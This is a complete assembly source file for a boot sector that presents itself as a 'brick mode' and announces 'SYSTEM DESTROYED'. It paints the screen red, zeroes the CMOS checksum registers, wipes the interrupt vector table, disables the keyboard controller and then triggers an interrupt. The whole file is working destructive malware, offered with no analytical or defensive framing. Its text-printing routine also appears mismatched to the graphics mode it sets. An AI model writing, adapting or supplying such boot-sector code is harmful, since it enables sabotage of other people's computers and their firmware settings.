format binary
org 0x7c00

use16

start:
    cli

    mov ax, 0x0013
    int 0x10

    mov ax, 0xA000
    mov es, ax

    mov cx, 64000
    mov al, 0x04
    xor di, di
    rep stosb

    mov si, msg
    mov di, 3840
    call print

    mov al, 0x2E
    out 0x70, al
    mov al, 0x00
    out 0x71, al

    mov al, 0x2F
    out 0x70, al
    mov al, 0x00
    out 0x71, al

    xor ax, ax
    mov es, ax
    xor di, di
    mov cx, 1024
    rep stosb

    mov al, 0xAD
    out 0x64, al

    sti
    int 0x00

print:
    mov ax, 0xA000
    mov es, ax
.loop:
    lodsb
    test al, al
    jz .done
    mov ah, 0x0F
    stosw
    jmp .loop
.done:
    ret

msg db 'EL CIENCO BRICK MODE ACTIVE SYSTEM DESTROYED', 0

times 510 - ($-$$) db 0
dw 0xAA55
